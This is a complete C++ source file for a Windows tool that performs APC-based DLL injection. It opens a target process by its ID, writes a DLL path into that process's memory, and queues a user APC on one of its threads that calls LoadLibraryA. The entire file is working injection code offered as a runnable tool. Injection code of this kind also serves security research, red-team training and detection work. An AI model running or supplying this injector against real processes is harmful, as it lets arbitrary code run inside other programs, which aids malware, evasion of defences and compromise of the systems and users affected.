#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <string>


#define LOAD_LIBRARY_VERSION "LoadLibraryA"

int main(int argc, char* argv[])
{
	unsigned long chosenProcessId = 0;
	HANDLE chosenProcess = NULL;
	HANDLE threadSnapshot = NULL;
	THREADENTRY32 chosenProcessThread = { 0 };
	BOOL threadEnumerationStatus = FALSE;
	HANDLE chosenThreadHandle = NULL;
	int injectedDllPathLength = 0;
	HMODULE kernel32Handle = NULL;
	FARPROC loadLibraryAddress = NULL;
	BOOL writeProcessMemorySuccess = FALSE;
	LPVOID remoteProcessAllocatedMemory = NULL;

	
	if (3 > argc)
	{
		std::cout << "Usage: " << argv[0] << " [PID] [DLL absolute path]" << std::endl;
		return -1;
	}
	
	// Check if given PID is negative because std::stoul doesn't fail with negative numbers.
	if (std::strstr(argv[1], "-"))
	{
		std::cout << "Please enter a valid process ID" << std::endl;
		return -2;
	}

	try
	{
		chosenProcessId = std::stoul(argv[1]);
	}
	catch (std::invalid_argument const& ex)
	{
		std::cout << ex.what() << std::endl;
		return -2;
	}
	catch (std::out_of_range const& ex)
	{
		std::cout << ex.what() << std::endl;
		return -2;
	}

	//Open chosen process to allocate memory for the DLL path.
	chosenProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, chosenProcessId);
	if (NULL == chosenProcess)
	{
		std::cout << "[-] OpenProcess failed." << std::endl;
		return -3;
	}
	std::cout << "[+] Created process handle." << std::endl;
	

	//Create a snapshot to find a thread for adding an APC to it.
	threadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (INVALID_HANDLE_VALUE == threadSnapshot)
	{
		std::cout << "[-] CreateToolhelp32Snapshot failed. " << GetLastError() << std::endl;
		return -4;
	}

	//Initialize the size to make the Thread32First work. (It is required)
	chosenProcessThread.dwSize = sizeof(THREADENTRY32);

	//Enumerate through all threads to find one thread of the chosen process.
	threadEnumerationStatus = Thread32First(threadSnapshot, &chosenProcessThread);
	do
	{
		if (!threadEnumerationStatus)
		{
			std::cout << "[-] Thread enumeration failed." << GetLastError() << std::endl;
			return -4;
		}
		if (chosenProcessThread.th32OwnerProcessID == chosenProcessId)
		{
			break;
		}
		threadEnumerationStatus = Thread32Next(threadSnapshot, &chosenProcessThread);
	} while (true);

	//Open thread to add the APC to its APC queue.
	chosenThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, chosenProcessThread.th32ThreadID);
	if (NULL == chosenThreadHandle)
	{
		std::cout << "[-] OpenThread failed." << std::endl;
		return -5;
	}

	//Alocates memory on remote process for the DLL path to use as parameter to LoadLibrary.
	injectedDllPathLength = strnlen(argv[2], MAX_PATH) * sizeof(argv[2][0]) + sizeof(argv[2][0]);
	remoteProcessAllocatedMemory = VirtualAllocEx(chosenProcess, NULL, injectedDllPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (NULL == remoteProcessAllocatedMemory)
	{
		std::cout << "[-] VirtualAllocEx failed." << std::endl;
		return -6;
	}
	std::cout << "[+] Allocated memory for dll path at: 0x" << std::hex << std::uppercase << remoteProcessAllocatedMemory << std::endl;

	//Writes the DLL path on the remote process.
	writeProcessMemorySuccess = WriteProcessMemory(chosenProcess, remoteProcessAllocatedMemory, argv[2], injectedDllPathLength, NULL);
	if (!writeProcessMemorySuccess)
	{
		std::cout << "[-] WriteProccessMemory failed" << std::endl;
		return -7;
	}

	//Get address of the LoadLibrary function.
	kernel32Handle = GetModuleHandle(TEXT("kernel32.dll"));
	if (NULL == kernel32Handle)
	{
		std::cout << "[-] GetModuleHandle failed." << std::endl;
		return -8;
	}
	std::cout << "[+] Got kernel32.dll module handle succesfully" << std::endl;

	loadLibraryAddress = GetProcAddress(kernel32Handle, LOAD_LIBRARY_VERSION);
	if (NULL == loadLibraryAddress)
	{
		std::cout << "[-] GetProcAddress failed." << std::endl;
		return -9;
	}
	std::cout << "[+] LoadLibrary Address is at: 0x" << std::hex << std::uppercase << loadLibraryAddress << std::endl;

	if (QueueUserAPC((PAPCFUNC)loadLibraryAddress, chosenThreadHandle, (ULONG_PTR)remoteProcessAllocatedMemory))
	{
		std::cout << "[+] Added APC successfully" << std::endl;
	}
	else {
		std::cout << "[-] QueueUserAPC failed. :(" << std::endl;
		return -10;
	}


	return 0;
}